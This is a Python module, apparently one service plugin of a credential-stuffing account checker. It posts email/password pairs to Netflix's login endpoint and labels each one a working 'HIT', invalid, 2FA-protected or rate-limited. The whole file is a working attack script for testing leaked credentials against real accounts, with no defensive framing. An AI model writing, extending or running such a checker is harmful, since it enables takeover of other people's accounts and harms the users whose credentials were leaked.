# language: Python 3.11 — services/netflix.py
import re

import aiohttp

from .base import BaseService, CheckResult, Status
from config import USER_AGENT


class NetflixService(BaseService):
    name = "netflix"

    async def check(self, session: aiohttp.ClientSession, email: str, pw: str) -> CheckResult:
        try:
            # netflix login page sets a few cookies we need for the auth call
            async with session.get(
                "https://www.netflix.com/login",
                headers={"User-Agent": USER_AGENT},
            ) as r:
                page = await r.text()

            # extract authURL — the login POST endpoint
            m = re.search(r'"authURL"\s*:\s*"([^"]+)"', page)
            auth_url = m.group(1) if m else "https://www.netflix.com/api/shakti/v3/login"
            if auth_url.startswith("/"):
                auth_url = "https://www.netflix.com" + auth_url

            payload = {
                "email": email,
                "password": pw,
                "rememberMe": True,
            }
            async with session.post(
                auth_url,
                json=payload,
                headers={
                    "User-Agent": USER_AGENT,
                    "Content-Type": "application/json",
                },
                allow_redirects=True,
            ) as r:
                status_code = r.status
                try:
                    j = await r.json(content_type=None)
                except Exception:
                    j = {}
                final = str(r.url)

            if status_code == 401:
                return CheckResult(self.name, email, Status.INVALID, "unauthorized")
            if status_code == 429:
                return CheckResult(self.name, email, Status.LOCKED, "rate limited")

            if isinstance(j, dict):
                err = j.get("errorCode") or j.get("error") or ""
                if "INVALID_CREDENTIALS" in str(err).upper():
                    return CheckResult(self.name, email, Status.INVALID, "bad credentials")
                if "TWO_FACTOR" in str(err).upper() or j.get("twoFactorRequired"):
                    return CheckResult(self.name, email, Status.TWOFA, "2fa required")
                if j.get("success") or j.get("memberId") or "memberId" in str(j):
                    return CheckResult(self.name, email, Status.HIT, "session ok")

            if "/browse" in final or "/profiles" in final:
                return CheckResult(self.name, email, Status.HIT, "session ok")
            if "login" in final and status_code == 200:
                return CheckResult(self.name, email, Status.INVALID, "bad credentials")

            return CheckResult(self.name, email, Status.ERROR, f"http {status_code}")
        except Exception as e:
            return CheckResult(self.name, email, Status.ERROR, str(e)[:120])
